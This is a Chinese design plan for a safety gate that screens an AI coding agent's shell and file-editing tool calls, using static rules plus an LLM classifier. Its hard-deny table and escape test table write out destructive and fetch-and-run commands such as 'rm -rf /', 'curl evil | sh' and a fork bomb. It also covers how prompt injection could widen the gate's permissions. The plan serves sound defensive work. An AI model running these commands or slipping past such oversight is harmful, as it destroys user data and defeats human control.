# pi-jev-suite — 实施方案

> **状态：方案阶段。未写任何代码。**
> 目标：pi 里**唯一**的 Jev 出口 —— 一个 core，三个消费方：**门禁** / **`jev_evaluate`** / **顾问第二意见**。
> 上下文钩子（压缩/裁剪）不在 v1 范围，但架构留口子。

---

## 0. 为什么要重写：5 个实测痛点 → 本方案的解

| # | 痛点（实测于 pi-jev-auto-mode 0.4.1） | 根因 | 本方案的解 |
| --- | --- | --- | --- |
| 1 | 白名单**放行不了**带 `;` / `&&` 的命令 | allow 模式匹配**整条命令字符串**，任何控制字符禁用**全部** allow 模式（deny 侧却不禁用，不对称） | **按段匹配**：先切段，每段各自匹配 |
| 2 | 每次判定刷一张 transcript 卡片（今天 120+） | `appendEntry` + renderer 无条件执行 | `records: full \| status \| off`，默认 `status`（只更新状态栏一行） |
| 3 | 规则写在**代码里**，改规则要改源码 | `SAFE_COMMANDS` / 33 条 pattern / 8 条硬拦全是常量 | 全部进配置；代码里只留**机制** |
| 4 | Jev 一挂**全拦**，连 `ls` 都跑不了 | 每条命令都问 Jev + 纯 fail-closed | 断路器 + 降级（降级时第①②层照常放行）+ `/jev-suite pause` |
| 5 | `rm` 被**文件名**误伤成硬拦（`rm "$d/pi-warden.md"`） | 用 `-[^\s]*[rR][^\s]*` 在**整条字符串**上猜选项，`-warden` 像 `-r` | 用**切段后的 argv** 判断，不看原始字符串 |

顺带修掉两个上游问题：

- `git -C <dir> status` 不被只读表识别（模式锚在开头，`-C` 夹在中间）→ 见 §2.3 的**全局选项表**
- 文档与 `uncertain` 默认值矛盾（文档说 fail-closed，代码是 `allow`）→ 本方案**没有 `uncertain` 这个概念**，语义只有「明确满足 / 明确否定 / 不确定」，不确定 = 送 Jev 或拦，不靠一个全局开关

**抄上游做对的部分**（不重造）：

- 脱敏正则（PEM / JWT / `sk-` / `ghp_` / `AKIA` / Bearer / `api_key=…`）
- 只发**路径 + 脱敏后的命令文本**，**绝不发文件内容 / diff**
- 意图只取 **user 角色**消息（防仓库内容自我授权）
- 失败映射：timeout / network / http / malformed → 不当作"同意"
- 三条条件的阈值用上游**实测值**做起点，不拍脑袋

---

## 1. 架构

### 1.1 目录结构

```text
pi-jev-suite/
  PLAN.md                 ← 本文档
  package.json            ← pi.extensions: ["./index.ts"]
  index.ts                ← 唯一入口：读配置、注册三个消费方
  src/
    config.ts             ← schema + 加载 + 合并 + 校验 + 默认值
    jev.ts                ← ★ core：唯一发起网络请求的地方（传输 + 记账 + 日志）
    policy.ts             ← ★ 纯函数：切段 / 只读判定 / 硬拦 / 匹配（无 IO、无时钟、无网络）
    gate.ts               ← 消费方 1：门禁（tool_call）
    tools.ts              ← 消费方 2+3：jev_evaluate + 顾问
  test/
    chain.test.ts         ← 切段（引号 / 转义 / 嵌套）
    policy.test.ts        ← 匹配 + 只读 + 硬拦 + **逃逸用例**
    decide.test.ts        ← 3 层流水线（假 engine，不打网络）
    jev.test.ts           ← 传输 + 记账（移植 fork 已有的测试）
    e2e.mjs               ← 真 key 跑 5 条（本地手跑，不进 CI 默认）
```

### 1.2 模块边界（硬规则）

1. **`src/jev.ts` 是唯一发网络请求的地方** —— 任何消费方都不许自己 fetch。配额、重试、脱敏、日志只在那一处。
2. **`src/policy.ts` 是纯函数** —— 无 IO、无网络、无时钟、无随机。安全敏感逻辑必须能脱离 pi 单独测（今天的 `/tmp/wtest` 就是靠这个属性）。
3. **消费方之间互不 import** —— 门禁不知道工具的存在。
4. 要加第 4 个消费方（比如 v2 的上下文钩子），只加一个文件 + 在 `index.ts` 注册，**不改 core**。

### 1.3 两种接入方式（必须都支持）

| | 官方 TypeSafe | 公司网关（gateway） |
| --- | --- | --- |
| `protocol` | `systemone` | `decisions` |
| 端点 | `POST {baseUrl}/v1/systemone` | `POST {baseUrl}/api/alpha/decisions` |
| 契约 | TypeSafe System One | OpenRouter Decisions（网关转译） |
| 验证状态 | ✅ 已验证（`typesafe_evaluate` 实测 887ms 返回 `jev-1.13.0`） | ✅ 已验证（今天实测，返回体与官方同形） |

**关键事实：两者响应体同形** —— 都是 `answers[key].noul` / `model` / `usage`。
→ **一个解析器，两种协议。** 差别只有三处：**URL**、**key 验证方式**、**model 名**。

#### 预设表（把今天踩过的坑编进去，避免再踩）

| `preset` | protocol | baseUrl | model |
| --- | --- | --- | --- |
| `typesafe` | systemone | `https://api.typesafe.ai` | `jev-1.13.0` |
| `gateway` | decisions | `https://gateway.invalid` | `typesafe/jev-1.13` |
| `openrouter` | decisions | `https://openrouter.ai` | `typesafe/jev-1.13` |
| `custom` | 自填 | 自填 | 自填 |

**两个非 URL 的坑（今天实测）**

1. 网关**只认** `typesafe/jev-1.13` —— `jev-latest` / `~typesafe/jev-latest` 返回 403，`typesafe/jev-latest` 返回 400。写死在预设里。
2. key **必须用真实提问验证**（发一个丢弃用的 noul 问题），**不能用 `/v1/models`** —— 网关返回 OpenAI 形状的 `{data:[…]}`，SDK 期望 `{models:[…]}`，会报成「key 验证失败」并指向错误方向（今天卡在这上面）。两种协议都用同一个探测方式 → 一套代码。

#### key 槽位按协议分开

`<agentDir>/secrets/pi-jev-suite-<protocol>-api-key`（0600）。
环境变量 `PI_JEV_SUITE_API_KEY` 覆盖当前协议。
**故意不复用 `TYPESAFE_API_KEY`** —— 别的包也在读它（今天差点把网关 key 发到官方端点）。

#### 默认走哪个 / 能不能混用

`provider` 是**默认**，每个消费方可单独覆盖（`gate.provider` / `tools.provider`）。
例：**门禁走公司网关**（量大、花公司的钱），**`jev_evaluate` / `ask_advisor` 走官方**（偶尔用、算自己的额度）。

**不做自动 fallback**（官方挂了自动切网关）：会让「这笔账算谁的」不可预测。要就说，加一个开关的事。

---

## 2. 判定流水线（门禁）

```text
输入：toolName + input
  │
  ├── 0. 硬拦（看**整条原文**，切段之前）
  │      命中 → 直接拦，不问 Jev，不可绕过
  │
  ├── 1. 配置层（0ms，按段）
  │      任一段命中 deny      → 拦
  │      每一段都命中 allow  → 放行
  │      否则 → 下一层
  │
  ├── 2. 只读层（0ms，按段）
  │      每一段都是"明显只读" → 放行
  │      否则 → 下一层
  │
  └── 3. Jev 层（~1s，fail-closed）
         一次请求问 3 个条件 → allow / block
```

**贯穿全流程的原则：静态分析只用来「放行明显安全的」。任何不确定 → 送去 ③。**
（第 ③ 层是兜底，不是主路径。上游的问题正是让 ③ 承担了本该由 ①② 承担的量。）

### 2.1 切段 `splitChain(command)`

- 分隔符：`;` `&&` `||` `|` `&` 换行
- **必须尊重引号与转义**：`'…'` / `"…"` / `\` 内的分隔符不切
- 输出：`Array<{ text, tainted }>`
- `tainted = true` 的段（含命令替换 `$( )`、反引号、无法静态解析的引号嵌套）→ **不允许走 ①②，直接送 ③**

`ponytail:` 这是一个**手写状态机，不是 shell 解析器**。上限：遇到 heredoc、复杂重定向、`eval` 一律标 `tainted` → 送 ③。不追求能解析所有 shell，只追求**不确定就不放行**。

### 2.2 惰性赋值段（今天 rtk 问题的解）

切段后，形如下面的段**跳过**（既不算命令，也不参与匹配）：

```text
(export )?NAME=VALUE        ← 且 VALUE 不含  $ ` ( ) ; | & < > \  （即无动态内容）
```

- `export RTK_DB_PATH='/var/folders/…/history.db'` → 跳过 ✓（这就是 rtk 的包装前缀）
- `export X=$(rm -rf /)` → VALUE 含 `$` `(` → **不跳过**，当普通段处理 → 送 ③ ✓
- `FOO='a;rm -rf /'` → 引号内 `;` 不切段，VALUE 含 `;` → 不跳过 ✓

### 2.3 只读判定（按段）

每一段依次：

1. **剥透明包装器** —— 配置项 `transparentWrappers`（默认 `["rtk"]`）。首 token 在列表里就剥掉再判。
   → 这样**不再依赖扩展加载顺序**（今天那个 `settings.json` 顺序 hack 可以撤掉）。
   `ponytail:` 名字叫"透明"是**配置者的声明**：声明 `rtk ls` 与 `ls` 安全等价。默认只放 `rtk`（输出压缩器），加任何东西都是显式行为。

2. **剥无害全局选项** —— 用**表**，不是猜：
   `git -C <path>` / `git -c <k=v>` / `git --no-pager` / `--no-color` / `-n` …
   → 修掉 `git -C <dir> status` 被判定 2117ms 的问题。

3. **首 token 在只读表里** → 再看参数形状是否命中禁例：
   - `find` + `-delete` / `-exec` / `-execdir` → 不放行
   - `sed` / `awk` 带 `-i` → 不放行
   - `grep` / `cat` / `head` / `tail` / `xxd` / `base64` 指向**凭据文件**（`.ssh/`、`.aws/`、`.gnupg`、`id_rsa*`、`.npmrc`、`.env`、`credentials*`）→ 不放行

4. 每一段都通过 → 放行

### 2.4 硬拦（看整条原文，不可配置放宽）

用**切段后的 argv** 判断，而不是在整条字符串上猜：

| 类 | 判据 |
| --- | --- |
| 递归删系统根 / 家目录根 | argv 里有递归 flag **且** target 解析后等于 `/`、`~`、`$HOME`、`/Users`、`/System`、`/etc`、`/usr`、`/var`、`/opt`、`/private` |
| 未解析的递归删除目标 | target 含变量/glob **且** 无法静态展开（`rm -rf $X`） |
| 格式化 / 擦签名 | `mkfs*`、`wipefs*` |
| 写裸设备 | `dd of=/dev/*` |
| macOS 抹盘 | `diskutil erase*` / `partitionDisk` |
| 强推保护分支 | `git push --force*` 且分支是 `main` / `master` |
| fork bomb | `:(){ : | :& };:` 形态 |
| 改写本包自己的安全配置 | 写 `~/.pi/agent/pi-jev-suite.json` 的 `allow`/`hardDeny`/`protectedPaths` 段 **且** 未经 `/jev-suite reload` |

→ `rm -rf "$d/pi-warden.md"` 在这里是 **argv `["rm","-rf","/abs/path/pi-warden.md"]`** → flag 是 `-rf`、target 是绝对路径且不在系统根列表 → **不是硬拦** ✓（修掉痛点 5）

---

## 3. Jev 层：只问 3 个条件

上游问 9 条，实测其中 2 条**从不参与决策**（`local_scope` p=0.53–0.89 vs 阈值 0.9；`prompt_injection_absent` p=0.56–0.67 vs 阈值 0.8 —— 永远落中间地带、被 hazard 模式忽略），其余多数也只在极端情况起作用。

本方案只问 3 条（每次调用省约 60% 输入 token）：

| 条件 | 问题 | 阈值（上游实测起点） | 性质 |
| --- | --- | --- | --- |
| `intent_coverage` | 用户是否要求了这件事？ | **0.6** | **必需项**：必须明确满足才放行 |
| `no_secret_egress` | 是否把敏感数据往外送？ | **0.97** | 禁项：明确否定则拦 |
| `no_irreversible_damage` | 是否不可恢复？ | **0.8** | 禁项：明确否定则拦 |

**组合规则**（三段，可读）：

```text
1. 任一"禁项"明确否定（p ≤ 1 − 阈值）  → 拦
2. intent_coverage 未明确满足（p < 0.6，或缺失） → 拦
3. 否则 → 放行
```

**不做"中间地带"这个额外概念** —— 它正是让上游 6 条条件空转的机制。这里：明确否定才拦，没明确满足就不放行 `intent_coverage`。语义只有两态，读代码不用在脑子里跑三档。

`ponytail:` 从 9 条砍到 3 条**丢掉了 defence-in-depth**：上游那些"没起作用"的条件里有几条是**本来就没被触发过**，不保证永远不触发。上限与升级路径：把条件表做成配置（`conditions: [...]`），想加回哪条就加回哪条，不用改代码。

---

## 4. 配置 schema

位置：`~/.pi/agent/pi-jev-suite.json`（全局）+ `<cwd>/.pi/pi-jev-suite.json`（项目，仅 trusted 时生效，**深度合并**）。

```jsonc
{
  "enabled": true,

  // 默认接入方式（见 §1.3）。preset 会展开成 protocol + baseUrl + model，
  // 显式写的字段覆盖 preset。
  "provider": {
    "preset": "gateway",             // gateway | typesafe | openrouter | custom
    "protocol": "decisions",         // systemone（官方）| decisions（网关）
    "baseUrl": "https://gateway.invalid",
    "model": "typesafe/jev-1.13",
    "timeoutMs": 4000,
    "maxRetries": 1
  },

  "budget": { "requestsPerDay": 2000, "usdPerDay": 1.0 },

  // 消费方可覆盖 provider（不写 = 用默认）。例：门禁走网关、工具走官方
  "tools": { "provider": { "preset": "typesafe" } },

  "gate": {
    "scope": "all",                    // all = 不认识的也送 Jev；matched = 只判命中的
    "records": "status",               // full | status | off   ← 修痛点 2
    "provider": { "preset": "gateway" }, // 可选：本消费方覆盖默认接入方式

    // 匹配对象是**段**，所以模式里不需要被控制字符限制（修痛点 1）
    "allow": [
      "ls *", "cat *", "pwd", "which *", "echo *",
      "git -C * status", "git * status", "npm --prefix * run test",
      "go test *", "cargo test *"
    ],
    "deny": ["sudo *", "chmod 777 *", "dd if=*", "* > /dev/*"],

    "hardDeny": "builtin",             // builtin | builtin+extra | extra
    "extraHardDeny": [],

    "readOnly": "builtin",             // 只读表，可扩展 / 可收窄
    "extraReadOnly": [],
    "transparentWrappers": ["rtk"],    // §2.3

    "protectedPaths": ["/etc/", "~/.ssh/", "~/.aws/", "**/.env", "**/.git/"],
    "selfConfigWritable": true         // 本包自己的配置不在保护路径里（修痛点 6）
  },

  "thresholds": {
    "intent_coverage": 0.6,
    "no_secret_egress": 0.97,
    "no_irreversible_damage": 0.8
  },

  "onUnavailable": {
    "mode": "degraded",                // degraded | block      见 §5
    "breakerAfter": 3,
    "cooldownMs": 60000
  }
}
```

**规则全部在配置里**（痛点 3）。代码里只剩**机制**：切段、匹配、组合、传输。

**改配置需要 `/jev-suite reload` 才生效** —— 防止 prompt injection 悄悄放宽自己的权限。改动时状态栏提示"配置已变，待 reload"。

### 实现与本节 schema 的差异（M1–M4 落地后回填）

- **删掉 `scope`**：它依赖上游那套 `flagged` + 33 条危险 pattern 的机制；本方案把规则移进了配置、判定对象改成了段，保留它只能做成一个 fail-open 开关（"认不出来就放行"），而你要的是"白名单直过、其余问 AI"，那正是默认行为。
- **删掉 `hardDeny` / `readOnly` / `selfConfigWritable`**：硬拦与只读表**内建在代码里**，配置只能追加不能取消；本包自己的配置与日志永远可写（没有开关 —— 一个"能把自己锁在外面"的开关没有安全收益，改配置本来就需要 reload）。
- **删掉 `extraHardDeny`**，保留 `extraReadOnly`。
- **删掉 `extraProtectedPaths`**：与 `protectedPaths` 语义重复。`protectedPaths` 是**附加**在内建保护表之上（内建表在 `src/policy.ts`）。
- 实际生效的 gate 字段：`provider` / `records` / `allow` / `deny` / `extraReadOnly` / `transparentWrappers` / `protectedPaths`。
- `records` 默认 `status`：每次判定只更新状态栏一行，写 transcript 卡片要显式设 `full`。
- key 槽位按协议分开（`pi-jev-suite-<protocol>-api-key`），环境变量只覆盖当前协议，**不复用** `TYPESAFE_API_KEY`。

---

## 5. 失败与降级（痛点 4）

今天真实处境：换了网关 key → gate 全拦 → 连 `ls` 都跑不了 → 只能整个关掉。

```text
状态机：ok ──连续失败 N 次──▶ degraded ──冷却后探测成功──▶ ok
          └── /jev-suite pause [30m] ──▶ paused ──到期──▶ ok
```

| 状态 | 第①②层 | 第③层 | 状态栏 |
| --- | --- | --- | --- |
| `ok` | 正常 | 问 Jev | `jev ok` |
| `degraded` | **正常放行** | **一律拦**，理由写明"Jev 不可用，已降级" | `jev DEGRADED (2m)` |
| `paused` | 放行 | 放行 | `jev PAUSED 27m` · 红字 |

**关键点：降级不瘫掉日常。** 第①②层不依赖 Jev，所以 Jev 挂了之后**只读命令和已白名单的命令照常跑** —— 今天卡住的正是"连 `ls` 都要问 Jev"这件事。
剩下的危险调用仍然拦住（保住 fail-closed 的立场）。真需要临时全放，用 `pause`：**会自动恢复**，比 `/jev-auto-mode off` 好（不会忘了开回来）。

**错误分类要说人话**：401/403 → "key 无效或被拒"，4xx → "网关不接受该模型名"，超时/网络 → "连不上"，形状不符 → "返回格式不认识"。不再统一成 "Could not reach the TypeSafe API"（今天把网关 key 的问题指到了错误方向）。

---

## 6. 可观测性：阈值不再拍脑袋

上游有校准通道但没暴露给用户，阈值只能在源码里读常数。本方案：

1. **每次判定写一行 jsonl**：`时间 / tool / 段数 / 命中哪层 / 各条件 p 与阈值 / 决定 / 耗时 / token / 状态`
2. `/jev-suite stats` 输出：
   - 各条件概率分布（min / 中位 / max）
   - **有多少次落"未明确"档** → 直接看出一条条件是不是空转
   - 第①②③层各承担多少量（快路径是否真的在起作用）
   - 日 token / 请求数 / 估算开销
3. `/jev-suite explain` 显示最近一次判定为什么是这个结果

→ 想砍条件、调阈值，看 stats 就有依据，不用改代码再观察。

---

## 7. 三个消费方

### 7.1 门禁（`gate.ts`）

`pi.on('tool_call')`，工具：`bash` / `write` / `edit`（与上游同）。

- `bash` → §2 流水线
- `write` / `edit` → 只判「目标是否在 cwd 外」或「是否在保护路径」，**绝不读文件内容**
- **不依赖扩展加载顺序**（透明包装器接管了 rtk 的包装）

### 7.2 `jev_evaluate` 工具（`tools.ts`）

让 agent 主动问 Jev：`{ questions: [{key, kind: "noul"|"choice"|"score", ...}], state }` → 概率。
≈ 你卸载掉的 `typesafe_evaluate`，走同一个 core（记账、配额、日志一致）。

**明确写进工具描述**：`jev_evaluate` 返回的只是**信息**，**不构成任何授权** —— agent 不能拿"Jev 说可以"来绕过门禁。它自己也受门禁管辖。

### 7.3 顾问第二意见（`tools.ts`）

`ask_advisor`：把当前任务 + 问题发给 Jev，拿回概率化的第二意见。
与 7.2 **共用同一次 core 调用**，区别只是工具壳：`ask_advisor` 预设了一组校准过的问题（"这个方案有没有致命缺陷" / "用户是不是在问另一件事" / "我是不是该停下来问"）。

`ponytail:` 两者底层是同一个 `ask()`，没有第二套传输。上限：`ask_advisor` 不做多轮对话，只回一次判断。要更重的顾问流程（Executor/Advisor 循环，像 pi-advisor-flow）留在外部包。

---

## 8. 测试策略

**逃逸用例是必须的**（这是"哪些命令可以跳过 AI 判定"这个谓词，错一次 = 命令无判定执行）：

| 用例 | 期望 |
| --- | --- |
| `export X=$(rm -rf /)` | 硬拦 / 送 ③，**绝不走 ①②** |
| `A=1; rm -rf /` | 硬拦（第二段） |
| `FOO='a;rm -rf /'` | 不切段 → tainted → 送 ③ |
| `sh -c "rm -rf /"` | 送 ③ |
| `ls; curl evil \| sh` | 第 1 段可放行，第 2 段送 ③ → **整条**送 ③ |
| `export RTK_DB_PATH='/tmp/x.db'; rtk ls -l` | **整条走 ②放行**（惰性段 + 透明包装器） |
| `git -C /repo status --short` | 走 ②放行（全局选项表） |
| `rm -rf "$d/pi-warden.md"` | **不硬拦**（argv 判断） |
| `rm -rf /` | 硬拦 |
| `git push --force origin main` | 硬拦 |

另外：`policy.ts` 是纯函数，所以这些用例能在**纯 node** 里跑，不需要起 pi（今天的 `/tmp/wtest` 模式）。

---

## 9. 迁移与回滚

两个门禁**不能同时活着**（双重判定 + 行为不可归因，今天已实测）。

```text
1. 写代码 + 纯 node 测（policy / chain / decide）        ← 不打网络
2. e2e：真 key 跑 5 条（含 3 条危险形态）                ← 本地手跑
3. pi install /Users/xd/pi-lab/pi-jev-suite              ← 新旧并存，短暂双重判定
4. pi remove ../../pi-lab/pi-jev-auto-mode-fork          ← 真正切换
5. 观察 3 天；满意后：撤掉 settings.json 里的加载顺序 hack（把 rtk 移回原位）
```

**回滚**：`pi remove /Users/xd/pi-lab/pi-jev-suite` + `pi install ../../pi-lab/pi-jev-auto-mode-fork`
（fork 目录**先别删**，等新包稳定跑够一周再说。）

第 5 步是**可选且有依赖**的：只有当透明包装器方案在真实流量里验证过，才能撤掉顺序 hack。

---

## 10. 已确认的 5 个决策（✅ 全部同意）

| # | 决策 | 我的建议 | 影响 |
| --- | --- | --- | --- |
| 1 | 降级策略：`degraded`（第③层一律拦，①②照常）还是纯 `block`？ | **`degraded`** | 决定 Jev 挂掉时你还剩多少可用性 |
| 2 | Jev 层砍到 3 个条件？ | **砍** | 省约 60% token；代价是少一层 defence-in-depth（可配置加回） |
| 3 | 认 `rtk` 为**透明包装器**（从而能撤掉加载顺序 hack）？ | **认** | 撤掉一个脆弱的顺序依赖；代价是承认"`rtk X` ≡ `X`"这个声明 |
| 4 | 本包自己的配置**不放进保护路径**（可以从 pi 里改，但需 reload）？ | **放** | 修痛点 6；代价是给自己留了一个可写的安全配置面 |
| 5 | 「明确否定才拦」的两态语义（不要上游的"中间地带"）？ | **两态** | 更可读；代价是同一条条件承担两种角色时（如 `intent_coverage`）要单独写规则 |

---

## 11. 里程碑

| 阶段 | 内容 | 时间 |
| --- | --- | --- |
| M0 | ~~你确认 §10 五个决策~~ ✅ **已确认** | — |
| M1 | `config.ts` + `policy.ts` + 测试（纯 node，不打网络） | 半天 |
| M2 | `jev.ts`：**两种协议** + 记账 + 日志（`decisions` 直接移植 fork 已测通的传输；`systemone` 只差一个 URL，解析器共用） | 2.5 小时 |
| M3 | `gate.ts` + 3 层流水线 + 逃逸用例 | 半天 |
| M4 | `tools.ts`（`jev_evaluate` + `ask_advisor`）+ `index.ts` | 2 小时 |
| M5 | e2e + 切换 + 观察 | 每天 10 分钟，3 天 |

→ **M1–M4 约 1.5 天**（有 fork 的传输层和测试可抄）；**调到能日用 2-3 天**。

---

## 附：不做什么（明确排除）

- ❌ 上下文 / 压缩钩子（v2，架构留口子）
- ❌ 多轮顾问对话（只回一次判断）
- ❌ 自己实现 SDK（直接 fetch，因为要打到网关的 `/api/alpha/decisions`）
- ❌ `uncertain` 全局开关（被 §3 的两态语义取代）
- ❌ 沙箱 / 授权票据（上游那套 broker、grant 机制不引入 —— 你要的是"白名单直过、其余问 AI"）
